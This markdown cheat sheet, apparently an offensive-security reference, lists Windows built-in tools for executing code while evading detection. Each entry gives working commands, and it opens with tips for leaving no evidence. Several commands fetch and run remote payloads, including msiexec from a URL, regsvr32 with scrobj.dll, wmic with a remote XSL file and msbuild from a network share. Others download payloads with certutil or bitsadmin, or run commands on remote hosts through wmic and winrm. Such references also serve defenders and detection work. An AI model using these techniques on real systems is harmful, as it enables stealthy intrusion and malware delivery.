# CodeExecutionOnWindows

As an attacker often your aim is to execute code on a target system while simultaneously avoiding detection. 
Luckily Windows provides many built in tools to help you execute code while leaving very little evidence behind. 

A list of ways to execute code, including examples, are shown below. Note that UAC bypasses and DLL hijacking will not be included as these are covered elsewhere.

#### General tips:

To remain hidden ideally you want to:

- Avoid creating new processes/network connections
- Avoid creating anomalous parent/child relationships
- Avoid creating/modifying files/registry entries
- Avoid creating memory anomalies
- Avoid leaving evidence in log files

If you are going to drop files, then drop utilities to help run code as opposed to dropping the payload itself.

#### References:

Microsoft command line reference:
https://technet.microsoft.com/en-us/library/cc772390(v=ws.11).aspx

UAC Bypasses:
https://github.com/hfiref0x/UACME


### Code Execution Techniques:

- appsyncvpublishing.exe
  - Description: This utility supports the ability to execute powershell making it an excellent alternative to Powershell.exe.
  - Example: SyncAppvPublishingServer.exe "n;calc"

- control.exe
  - Description: The control panel feature within Windows supports the execution of arbitrary DLLs as demonstrated in the shadowbrokers release. (https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/)
  - Example: control.exe payload.dll

- csc.exe
  - Description: The .NET compiler can be used to compile a c# payload locally that can then be executed.
  - Example: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
  - Example payload.cs: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}}
  
- cscript.exe/wscript.exe
  - Description: Windows script engines that support both VBS and JScript execution. CScript is the console version, WScript is the Window version. Neither version supports scripts being supplied on the command line, instead a file must be created containing the script or a funky bat file wrapper.
  - Example: cscript.exe test.vbs (where test.vbs contains WScript.Echo "test")

- forfiles.exe
  - Description: Forfiles supports the ability to execute commands and seems to be equivalent to cmd.
  - Example: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

- msbuild.exe
  - Description - Microsoft's build utility where you can supply an inline build task to execute code (https://msdn.microsoft.com/en-us/library/dd722601.aspx)
  - Example: C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbuild.exe \\server\payload

- msiexec.exe
  - Description - The Windows installer typically used to install new software or patches. It be used to download and execute a remote payload.
  - Example: msiexec /i http://server/package.msi

- mshta.exe
  - Description: MSHTA can be used to execute HTA files (containing scripts) or directly execute VBScript/JScript from the command line.
  - Example: mshta bad.hta
  - Example: mshta vbscript:Execute("MsgBox(""amessage"",64,""atitle"")(window.close)")
  - Example: mshta javascript:alert('test');

- powershell.exe
  - Description: The most well known and most useful attacker utility. Powershell can be operated in console mode, with commands provided on the command line or through passing a ps1 file containing commands.
  - Example: powershell -c calc
  - Example: powershell -exec bypass -File test.ps1
  
- regsvr32.exe
  - Description: Command-line tool that registers dll files as command components in the registry. Notable for its use to bypass UAC and useful as it supports remote DLL retrieval.
  - Example: regsvr32 /s /n /u /i:[URL] scrobj.dll

- rundll32.exe
  - Description: Loads and runs DLLs. Three parameters are typically used, the DLL to be executed, the function within the DLL to call and any arguments.
  - Example: rundll32 SHELL32.DLL,ShellExec_RunDLL "calc"
  - Example: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test');

- winrm.exe
  - Description: WinRM, or Windows Remote Management provides the ability to remotely execute wmi commands. The winrm service is disabled by default but can be enabled.
  - Example: winrm qc -q & winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}

- wmic.exe
  - Description: Command line tool for WMI.
  - Example: wmic process call create "cmd.exe /c calc"
  - Example: wmic /node:[targetIPaddr] /user:[admin] process call create "cmd.exe /c [command]"
  - Example: wmic os get /format:"https://server/payload.xsl"

### Download Techniques:

- certutil.exe
  - Description: Allows you to download a payload.
  - Example: certutil -ping [URL]
  - Example: certutil -urlcache -split -f [URL] [output-file]
  
- bitsadmin.exe
  - Description: Allows you to download a payload.
  - Example: bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path]

